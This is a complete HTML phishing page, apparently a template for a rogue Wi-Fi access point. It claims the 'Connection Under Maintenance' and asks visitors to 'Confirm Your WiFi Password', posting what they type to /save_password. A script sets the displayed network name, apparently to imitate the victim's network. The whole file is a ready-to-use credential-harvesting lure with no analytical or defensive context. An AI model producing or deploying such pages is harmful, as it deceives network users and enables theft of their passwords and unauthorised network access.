
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=0.8, minimal-ui">
    <meta name="description" content="244v234">
    <title>WiFi Password Confirmation</title>
    <link rel="stylesheet" href="/screen.css">
    <script src="js/site.js"></script>
    <script src="js/credential.js"></script>
</head>
<body onload="load()">
    <div class="container" style="
        background-color: #FFFFFF;
        width: 450px;
        height: 400px;
        margin: 7em auto;
        border-radius: 1.5em;
        box-shadow: 0px 11px 35px 2px rgba(0, 0, 0, 0.14);">
        
        <div class="row">
            <div class="col-12">
                <div id="error" class="hide"></div>
                <br>
                <p class="centered" align="center" style="
                    padding-top: 40px;
                    color: #8C55AA;
                    font-family: 'Ubuntu', sans-serif;
                    font-weight: bold;
                    font-size: 23px;">
                    Connection Under Maintenance <br>
                    Please Confirm Your <b>WiFi</b> Password
                </p>
                
                <div class="box">
                    <h2 id="ssid" style="text-align: center;"></h2>
                    
                    <form action="/save_password" method="POST">
                        <input type="password" id="passwifi" name="password" required placeholder="Enter your password" style="
                            width: 76%;
                            color: rgb(38, 50, 56);
                            font-weight: 700;
                            font-size: 14px;
                            letter-spacing: 1px;
                            background: rgba(136, 126, 126, 0.04);
                            padding: 10px 20px;
                            border: none;
                            border-radius: 20px;
                            outline: none;
                            box-sizing: border-box;
                            border: 2px solid rgba(0, 0, 0, 0.02);
                            margin-bottom: 50px;
                            margin-left: 46px;
                            text-align: center;
                            margin-bottom: 27px;
                            font-family: 'Ubuntu', sans-serif;">
                        
                        <input type="submit" value="Confirm" class="button" style="
                            text-shadow: 0px 0px 3px rgba(117, 117, 117, 0.12);
                            color: #fff;
                            text-decoration: none;
                            cursor: pointer;
                            border-radius: 5em;
                            background: linear-gradient(to right, #9C27B0, #E040FB);
                            border: 0;
                            padding-left: 40px;
                            padding-right: 40px;
                            padding-bottom: 10px;
                            padding-top: 10px;
                            font-family: 'Ubuntu', sans-serif;
                            margin-left: 35%;
                            font-size: 13px;
                            box-shadow: 0 0 20px 1px rgba(0, 0, 0, 0.04);">
                    </form>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
